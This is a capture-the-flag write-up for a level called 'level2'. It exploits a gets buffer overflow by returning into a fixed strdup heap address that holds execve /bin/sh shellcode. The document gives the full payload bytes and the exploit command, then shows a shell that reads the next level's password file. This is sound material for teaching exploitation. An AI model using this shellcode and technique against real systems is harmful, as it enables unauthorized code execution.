# Level 2

## Initial Context

- One file: `level2`

## Solving the Challenge

Running the file without any argument block on an input.
The program act like `cat`.

```bash
$ echo | ./level2

$ echo a | ./level2
a
$ echo hello | ./level2
hello
```

But a lot of characters seems to break it, looks like a `gets` exploit.

```bash
$ python -c 'print "A" * 128' | ./level2
Segmentation fault (core dumped)
```

By looking at the code, we can see that there are checks to avoid overwriting the return address to an address on the stack:

```c
void *return_address = __builtin_return_address(0);
if (return_address & 0xb0000000) == 0xb0000000) {
    _exit(1);
}
```

Running it with `ltrace` show a memory allocation (through `strdup`) at the end that always allocate to the same address.

```bash
$ echo A | ltrace ./level2
...
strdup("A")                                                         = 0x0804a008
...
$ echo A | ltrace ./level2
...
strdup("A")                                                         = 0x0804a008
...
```

Let's redirect the stack to the allocated memory of which we will put this [shell code](https://www.exploit-db.com/exploits/13357#:~:text=%22%5Cx31%5Cxc0%5Cx50%5Cx68//sh%5Cx68/bin%5Cx89%5Cxe3%5Cx50%5Cx53%5Cx89%5Cxe1%5Cx99%5Cxb0%5Cx0b%5Cxcd%5Cx80%22%3B).

The program reserve `80 bytes` for local variables before having the return address.

Since the shell code is `24 bytes` long, we need to add `56 bytes` as padding and then the new return address which is `0x0804a008`. (or `08 a0 04 08` in LE)

Here is our payload:

```python
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+ "a" * 56
+ "\x08\xa0\x04\x08"'
```

Let's save it in a file and send it to the vulnerable program:

```bash
$ python -c 'print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "a" * 56 + "\x08\xa0\x04\x08"' > /tmp/exploit2
$ cat /tmp/exploit2 - | ./level2
whoami
level3
cat /home/user/level3/.pass
<flag>
```

## Inspirations

- https://0xrick.github.io/binary-exploitation/bof5/
